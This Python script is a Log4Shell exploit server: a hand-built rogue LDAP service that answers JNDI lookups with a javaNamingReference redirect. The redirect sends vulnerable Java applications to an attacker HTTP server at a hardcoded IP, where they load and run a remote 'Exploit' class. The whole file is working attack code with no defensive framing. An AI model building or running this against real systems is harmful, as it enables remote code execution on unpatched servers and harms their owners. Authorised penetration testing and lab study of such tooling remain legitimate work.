#!/usr/bin/env python3
"""
Log4Shell LDAP exploit server — correct protocol implementation
Based on marshalsec LDAPRefServer response format
"""
import sys, socket, threading

ATTACKER_IP   = "10.1.60.216"
LDAP_PORT     = 1389
HTTP_PORT     = 8888
EXPLOIT_CLASS = "Exploit"

def build_response(msg_id):
    codebase = f"http://{ATTACKER_IP}:{HTTP_PORT}/".encode()
    factory  = EXPLOIT_CLASS.encode()

    def asn1_len(n):
        if n < 128:
            return bytes([n])
        elif n < 256:
            return bytes([0x81, n])
        else:
            return bytes([0x82, n >> 8, n & 0xff])

    def asn1_string(s):
        return bytes([0x04]) + asn1_len(len(s)) + s

    def asn1_seq(content):
        return bytes([0x30]) + asn1_len(len(content)) + content

    def asn1_set(content):
        return bytes([0x31]) + asn1_len(len(content)) + content

    def ldap_attr(name, *values):
        vals = b"".join(asn1_string(v) for v in values)
        return asn1_seq(asn1_string(name) + asn1_set(vals))

    # Build attributes — objectClass must come first so Java's LDAP provider
    # identifies this as a javaNamingReference before reading factory attrs
    attrs = (
        ldap_attr(b"objectClass",          b"javaNamingReference", b"top") +
        ldap_attr(b"javaClassName",        b"foo") +
        ldap_attr(b"javaFactory",          factory) +
        ldap_attr(b"javaCodeBase",         codebase)
    )

    dn_str = asn1_string(EXPLOIT_CLASS.encode())
    attrs_seq = asn1_seq(attrs)

    # SearchResultEntry [APPLICATION 4]
    entry_body = dn_str + attrs_seq
    search_entry = bytes([0x64]) + asn1_len(len(entry_body)) + entry_body

    # SearchResultDone [APPLICATION 5]
    done_body = bytes([0x0a, 0x01, 0x00, 0x04, 0x00, 0x04, 0x00])
    search_done = bytes([0x65]) + asn1_len(len(done_body)) + done_body

    # Wrap both in LDAPMessage envelopes
    def ldap_msg(mid, content):
        inner = bytes([0x02, 0x01, mid]) + content
        return asn1_seq(inner)

    return ldap_msg(msg_id, search_entry) + ldap_msg(msg_id + 1, search_done)


def handle(conn, addr):
    print(f"[+] LDAP connection from {addr}", flush=True)
    try:
        # Read bind request
        data = conn.recv(4096)
        if not data:
            conn.close()
            return
        print(f"[+] Bind request ({len(data)} bytes)", flush=True)

        # Message ID is at byte 4 (after 30 <len> 02 01 <msgid>)
        msg_id = data[4] if len(data) > 4 else 1
        print(f"[+] Bind msgID={msg_id}", flush=True)

        # Send bind response (success) with matching message ID
        bind = bytes([0x30, 0x0c, 0x02, 0x01, msg_id,
                      0x61, 0x07, 0x0a, 0x01, 0x00,
                      0x04, 0x00, 0x04, 0x00])
        conn.send(bind)

        # Read search request
        data = conn.recv(4096)
        if not data:
            conn.close()
            return
        print(f"[+] Search request ({len(data)} bytes)", flush=True)

        search_msg_id = data[4] if len(data) > 4 else 2
        response = build_response(search_msg_id)
        print(f"[+] Sending LDAP redirect → http://{ATTACKER_IP}:{HTTP_PORT}/#{EXPLOIT_CLASS}", flush=True)
        conn.send(response)

    except Exception as e:
        print(f"[-] Error: {e}", flush=True)
    finally:
        conn.close()


def main():
    print(f"[*] LDAP server on 0.0.0.0:{LDAP_PORT}", flush=True)
    print(f"[*] Redirecting to http://{ATTACKER_IP}:{HTTP_PORT}/#{EXPLOIT_CLASS}", flush=True)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", LDAP_PORT))
    s.listen(10)
    print("[*] Waiting for JNDI callback...\n", flush=True)

    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
